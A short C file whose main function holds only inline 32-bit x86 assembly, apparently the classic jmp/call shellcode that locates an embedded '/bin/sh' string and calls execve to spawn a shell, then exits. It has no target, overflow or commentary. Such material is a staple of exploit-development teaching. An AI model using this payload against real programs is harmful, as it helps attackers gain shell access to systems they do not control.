void main() {
__asm__(
        "jmp    0x2a\n\t"
        "popl   %esi\n\t"
        "movl   %esi,0x8(%esi)\n\t"
        "movb   $0x0,0x7(%esi)\n\t"
        "movl   $0x0,0xc(%esi)\n\t"
        "movl   $0xb,%eax\n\t"
        "movl   %esi,%ebx\n\t"
        "leal   0x8(%esi),%ecx\n\t"
        "leal   0xc(%esi),%edx\n\t"
        "int    $0x80\n\t"
        "movl   $0x1, %eax\n\t"
        "movl   $0x0, %ebx\n\t"
        "int    $0x80\n\t"
        "call   -0x2f\n\t"
        ".string \"/bin/sh\"\n\t"
);
}
